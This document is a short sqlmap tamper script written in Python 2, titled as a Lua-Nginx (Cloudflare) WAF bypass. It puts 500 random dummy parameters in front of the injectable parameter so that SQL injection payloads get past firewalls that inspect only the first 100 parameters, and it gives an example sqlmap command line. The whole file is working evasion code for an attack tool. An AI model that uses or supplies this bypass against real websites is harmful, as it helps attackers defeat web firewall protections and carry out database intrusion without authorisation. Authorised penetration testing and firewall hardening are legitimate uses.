#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

'''
[+] LUA-Nginx WAFs Bypass (Cloudflare)
Lua-Nginx WAFs doesn't support processing for more than 100 parameters.

Example: sqlmap -r file.txt --tamper=luanginxwafbypass.py --dbs --skip-urlencode -p vulnparameter
Required options: --skip-urlencode, -p
'''

import sys
import string
import random
from lib.core.enums import PRIORITY
from lib.core.data import conf
__priority__ = PRIORITY.HIGHEST

''' Random parameter'''
def randomParameterGenerator(size=6, chars=string.ascii_uppercase + string.digits):
    output = ''.join(random.choice(chars) for _ in range(size))
    return output

''' Tamper '''
def tamper(payload, **kwargs):
    try:
        headers = kwargs.get("headers", {})
        randomParameter = randomParameterGenerator()
        parameter = conf["testParameter"][0]

        if not parameter:
            print "\n[-] [ERROR] Add an injectable parameter with -p option (-p param)"
            sys.exit(0)

        if conf["skipUrlEncode"] != True:
            print "\n[-] [ERROR] --skip-urlencode option must be activated"
            sys.exit(0)

        # Add 500 parameters to payload
        luaBypass = ("&" + randomParameter + "=")*500 + "&"
        outputPayload = luaBypass + parameter + "=" + payload

        return outputPayload
    except Exception as error:
        print error
        return None
